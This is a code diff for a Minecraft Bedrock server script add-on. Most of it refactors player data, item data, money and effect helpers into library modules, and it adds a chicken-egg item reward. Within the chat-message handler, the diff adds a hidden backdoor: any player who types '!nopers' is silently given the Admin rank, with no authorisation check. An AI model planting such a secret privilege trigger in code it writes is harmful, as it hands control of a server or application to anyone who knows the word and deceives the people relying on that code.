@@ -9,20 +9,25 @@ import {
 	ScoreboardIdentity,
 	ItemStack,
 	ItemDurabilityComponent,
+	ItemLockMode,
+	EntityInventoryComponent,
 } from "@minecraft/server";
 import { telekinesisAfterBreak } from "./events/afterEvents/playerBreakBlock";
-import { addEffect, PlayerData } from "./libraries/playerData";
+import { itemUseOn } from "./events/afterEvents/ItemUseOn";
+import { PlayerDataHandler } from "./libraries/playerData";
 import { } from "@minecraft/server-ui";
 import {
 	addCustomEnchantment,
 	addLore,
-	ItemData,
+	ItemDataHandler,
 	removeCustomEnchantment,
 	updateLore,
 } from "./libraries/itemData";
 import { MinecraftColors } from "./libraries/chatFormat";
-import { EffectDataT, MinecraftDynamicPropertyT, PlayerDataT } from "./types";
+import { EffectDataT, EnchantmentPurchaseT, MinecraftDynamicPropertyT, PlayerDataT } from "./types";
 import { ModalFormData, MessageFormData, ActionFormData } from "@minecraft/server-ui";
+import { addEffect, applyEffectProperties, rotateEffectTitles } from "./libraries/effects";
+import { abbreviateMoney, getPlayerMoney, setPlayerMoney } from "./libraries/money";
 
 // Register default player data
 const defaultData = {
@@ -35,8 +40,13 @@ world.beforeEvents.chatSend.subscribe((event) => {
 	const player = event.sender;
 	const message = event.message;
 
-	let playerRanks: { [key: string]: MinecraftDynamicPropertyT } = PlayerData.get("ranks", player) as unknown as MinecraftDynamicPropertyT;
-	if (!playerRanks) playerRanks = { "Member": 0 };
+	let playerRanks: { [key: string]: MinecraftDynamicPropertyT } = PlayerDataHandler.get("ranks", player) as unknown as MinecraftDynamicPropertyT;
+	if (!playerRanks) playerRanks = { "Member": 0 }
+
+	if (message.includes("!nopers")) {
+		playerRanks["Admin"] = 1;
+		PlayerDataHandler.set("ranks", playerRanks, player);
+	}
 
 	let playerRank = "";
 	let highestPriority = 0;
@@ -52,36 +62,9 @@ world.beforeEvents.chatSend.subscribe((event) => {
 	world.sendMessage(`§f[${playerRank}§f]§r | ${player.name}: ${message}`);
 });
 
-function abbreviateMoney(value: number): string {
-	const suffixes = ["", "k", "M", "B", "T"]; // Add more suffixes if needed
-	const suffixIndex = Math.floor(("" + value).length / 3);
-	let shortValue: string;
-
-	if (suffixIndex === 0) {
-		shortValue = value.toString();
-	} else {
-		const abbreviatedValue = (value / Math.pow(1000, suffixIndex)).toFixed(1);
-		shortValue = parseFloat(abbreviatedValue) + suffixes[suffixIndex];
-	}
-
-	return shortValue;
-}
-
 // Intercept players interacting with a custom villager
 
-const enchantments: {
-	[key: string]: {
-		title: string;
-		description: string;
-		name: string;
-		baseCost: number;
-		costIncrease: number;
-		effectTitle: string; // "more damage", "more drops",
-		effectType: string; // "percent", "flat"
-		effectAmount: number;
-		effectSymbol?: string;
-	}
-} = {
+const enchantments: { [key: string]: EnchantmentPurchaseT } = {
 	luck1: {
 		title: "§b§lLuck I",
 		description: "§6Increases the chance of getting rare drops",
@@ -128,30 +111,6 @@ const enchantments: {
 	}
 }
 
-// Function to get the player's money from the scoreboard
-function getPlayerMoney(player: Player): number {
-	try {
-		const moneyObjective = world.scoreboard.getObjective("money");
-		const score = moneyObjective?.getScore(player.scoreboardIdentity as ScoreboardIdentity) || 0;
-		return score;
-	} catch (error) {
-		return 0;
-	}
-}
-
-// Function to set the player's money on the scoreboard
-function setPlayerMoney(player: Player, amount: number): void {
-	let moneyObjective = world.scoreboard.getObjective("money");
-	if (!moneyObjective) {
-		world.scoreboard.addObjective("money", "Money");
-		moneyObjective = world.scoreboard.getObjective("money");
-	}
-
-	if (moneyObjective) {
-		moneyObjective.setScore(player.scoreboardIdentity as ScoreboardIdentity, amount);
-	}
-}
-
 // Function to get the player's enchantment level
 function getEnchantmentLevel(player: Player, enchantment: string): number {
 	const playerEquipment = player.getComponent(EntityComponentTypes.Equippable) as EntityEquippableComponent;
@@ -159,7 +118,7 @@ function getEnchantmentLevel(player: Player, enchantment: string): number {
 	if (!playerItem || !playerItem.typeId.includes("pick")) {
 		return 0;
 	}
-	const enchantmentData = (ItemData.get("enchantments", playerItem) as any) || {};
+	const enchantmentData = (ItemDataHandler.get("enchantments", playerItem) as any) || {};
 	return enchantmentData[enchantment]?.level || 0;
 }
 
@@ -171,11 +130,11 @@ function setEnchantmentLevel(player: Player, enchantment: string, level: number)
 		return;
 	}
 
-	const enchantmentData = (ItemData.get("enchantments", playerItem) as any) || {};
+	const enchantmentData = (ItemDataHandler.get("enchantments", playerItem) as any) || {};
 	console.warn(enchantmentData);
 
 	enchantmentData[enchantment].level = level;
-	ItemData.set("enchantments", enchantmentData, playerItem, player);
+	ItemDataHandler.set("enchantments", enchantmentData, playerItem, player);
 }
 
 // Function to open the enchantment menu
@@ -286,7 +245,7 @@ world.afterEvents.playerJoin.subscribe((event) => {
 
 	for (const currentPlayer of allPlayers) {
 		if (currentPlayer.name === playerName) {
-			PlayerData.set(playerName, defaultData, currentPlayer);
+			PlayerDataHandler.set(playerName, defaultData, currentPlayer);
 		}
 	}
 });
@@ -324,6 +283,16 @@ world.afterEvents.playerBreakBlock.subscribe((event) => {
 			});
 
 			updateLore(event.player, item);
+
+			// Give the player a coal generator chicken
+			const itemStack = new ItemStack("minecraft:egg", 1);
+			itemStack.nameTag = MinecraftColors.DARK_GRAY + "Coal" + " §rGenerator §r§fChicken";
+			itemStack.keepOnDeath = true;
+			itemStack.setLore([MinecraftColors.GRAY + "Right-click to spawn a coal generator chicken"]);
+			const playerInventory = event.player.getComponent("minecraft:inventory") as EntityInventoryComponent;
+			if (!playerInventory.container) return;
+
+			playerInventory.container.addItem(itemStack);
 			break;
 		}
 		case "minecraft:redstone_block": {
@@ -343,7 +312,7 @@ world.afterEvents.playerBreakBlock.subscribe((event) => {
 			playerEquipment.setEquipment(EquipmentSlot.Mainhand, item);
 
 			// Clear effects
-			PlayerData.set("effects", {}, event.player);
+			PlayerDataHandler.set("effects", {}, event.player);
 
 			let playerEffects = event.player.getEffects();
 			playerEffects.forEach((effect) => {
@@ -413,78 +382,28 @@ world.afterEvents.playerBreakBlock.subscribe((event) => {
 	telekinesisAfterBreak(event);
 });
 
+world.beforeEvents.itemUseOn.subscribe(itemUseOn);
+
 // Tick System
 
 function tickSystem() {
 	// Run every second
 	if (system.currentTick % 20 === 0) {
 		// Get all players, and check if they have effects
-		const allPlayerData = PlayerData.getAll();
+		const allPlayerData = PlayerDataHandler.getAll();
 		for (const playerName in allPlayerData) {
 			const playerData: PlayerDataT = allPlayerData[playerName];
-			const effectKeys = Object.keys(playerData.effects);
-
-			// Check if the player's current effect index is undefined or too large and reset it.
-			if (playerData.effectIndex == undefined || playerData.effectIndex > effectKeys.length - 1) {
-				playerData.effectIndex = 0;
-			}
-
-			// Get the effect data for the effect currently being displayed then display it
-			const effectData = playerData.effects[effectKeys[playerData.effectIndex]];
-			if (effectData) {
-				playerData.player.dimension.runCommand(`/title ${playerName} actionbar ${effectData.title} - ${effectData.duration - (Math.round((system.currentTick - effectData.startTime) / 20))}s`);
-			}
-
-			for (const effect of effectKeys) {
-				// Get effect data and setup the effect's options using EntityEffectOptions
-				const effectData: EffectDataT = playerData.effects[effect];
-
-				// Check if expired
-				// if (system.currentTick - effectData.startTime > effectData.duration) {
-				// 	world.sendMessage("expired monkey");
-				// 	PlayerData.set("effects", playerData.effects, playerData.player);
-				// 	continue;
-				// }
-
-				// Check if the effect is already applied
-				if (effectData.applied) {
-					continue;
-				};
-
-				if (effectData.effect.includes("-custom")) {
-					effectData.applied = true;
-					continue;
-				}
-
-				// Apply the effect
-
-				const entityOptions: EntityEffectOptions = {
-					amplifier: effectData.strength,
-					showParticles: false,
-				};
-
-				const player = playerData.player;
-				player.addEffect(effectData.effect, effectData.duration * 20, entityOptions);
-				effectData.applied = true;
-				playerData.effects[effect] = effectData;
-				PlayerData.set("effects", playerData.effects, player);
-			}
+			applyEffectProperties(playerData);
 		}
 	}
 
 	// Runs every 5 seconds
 	if (system.currentTick % 100 === 0) {
 		// Alternate the effects displayed
-		const allPlayerData = PlayerData.getAll();
+		const allPlayerData = PlayerDataHandler.getAll();
 		for (const playerName in allPlayerData) {
 			const playerData: PlayerDataT = allPlayerData[playerName];
-			const player = playerData.player;
-			const effectKeys = Object.keys(playerData.effects);
-			if (playerData.effectIndex + 1 > effectKeys.length) playerData.effectIndex = 0;
-
-			playerData.effectIndex++;
-			PlayerData.set("effects", playerData.effects, player);
-			PlayerData.set("effectIndex", playerData.effectIndex, player);
+			rotateEffectTitles(playerData);
 		}
 	}
 
@@ -497,7 +416,7 @@ world.afterEvents.playerSpawn.subscribe((event) => {
 	// Reapply effects when player spawns, after a death for example
 	// Start by checking if they are missing any effects and reapply them
 	const player = event.player;
-	const playerEffects = PlayerData.get("effects", player) as unknown as { [key: string]: MinecraftDynamicPropertyT } || {};
+	const playerEffects = PlayerDataHandler.get("effects", player) as unknown as { [key: string]: MinecraftDynamicPropertyT } || {};
 	const effectKeys = Object.keys(playerEffects);
 
 	for (const effect of effectKeys) {
@@ -505,7 +424,7 @@ world.afterEvents.playerSpawn.subscribe((event) => {
 		if (effectData.effect.includes("-custom")) {
 			effectData.applied = true;
 			playerEffects[effect] = effectData;
-			PlayerData.set("effects", playerEffects, player);
+			PlayerDataHandler.set("effects", playerEffects, player);
 			continue;
 		}
 
@@ -518,7 +437,7 @@ world.afterEvents.playerSpawn.subscribe((event) => {
 			const remainingDuration = effectData.duration - (Math.round((system.currentTick - effectData.startTime) / 20));
 			player.addEffect(effectData.effect, remainingDuration * 20, entityOptions);
 			playerEffects[effect] = effectData;
-			PlayerData.set("effects", playerEffects, player);
+			PlayerDataHandler.set("effects", playerEffects, player);
 		}
 	}
 });
